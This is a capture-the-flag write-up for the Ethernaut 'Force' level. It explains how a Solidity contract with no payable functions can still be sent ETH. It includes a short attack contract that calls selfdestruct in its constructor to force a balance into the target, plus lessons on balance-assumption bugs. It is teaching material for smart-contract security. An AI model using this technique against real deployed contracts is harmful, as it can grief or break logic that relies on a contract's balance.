# Ethernaut Challenge: Force 🧨

**Level Goal:**  
Make the balance of the contract greater than zero.

``` solidty
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */
}
```
## 🔍 Challenge Summary

You're given a contract address — but it has no public methods, no payable functions, and doesn’t accept ETH in any normal way.

So how do you send it ETH?

**Hint:** Sometimes the EVM gives you secret tools that let you go around the rules... and one of those tools is `selfdestruct()`.

---

## 🧠 Key Concepts

### 1. selfdestruct()
This EVM opcode:
- Deletes the calling contract from the blockchain.
- Forces any remaining balance to be sent to a target address — **even if that address has no payable functions or code at all**.

### 2. Fallback Doesn’t Matter Here
The victim contract doesn’t need a fallback function. ETH gets sent directly into its balance **via EVM mechanics**, not by calling any of its functions.

---

## 🛠️ The Attack

Here’s the minimal contract we use to blow ourselves up and force ETH into the target:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract AttackForce {
    address public owner;

    constructor(address _force) payable {
        owner = msg.sender;
        selfdestruct(payable(address(_force)));
    }
    
}
```

✅ Victory Check
Run this in your browser console (or web3 console) to verify:
```
await web3.eth.getBalance(instance)
```
## 🧠 What I Learned
 Contracts can receive ETH even without any payable function, using selfdestruct.<br />
 This can be used to grief or break logic that assumes a contract will never receive ETH. <br />
 EVM mechanics > Solidity code — and smart attackers go deeper than the code surface.



🧠 Stay Sharp
Always ask: “What assumptions does this contract make about its balance, and can I break them?”

